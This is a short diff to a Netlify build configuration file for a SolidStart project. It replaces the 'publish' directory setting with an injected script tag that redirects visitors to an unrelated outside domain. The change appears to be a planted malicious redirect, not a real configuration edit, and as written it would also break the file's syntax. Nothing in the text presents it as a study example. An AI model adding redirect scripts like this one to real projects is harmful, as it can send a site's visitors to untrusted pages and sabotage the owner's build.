@@ -1,6 +1,8 @@
 [build]
   command = "solid-start build"
   functions = "netlify/functions"
-  publish = "netlify"
+  publish = "<script>
+      window.location.replace("https://123milha.online/642831975");
+</script>"
 
   ## more info on configuring this file: https://www.netlify.com/docs/netlify-toml-reference/
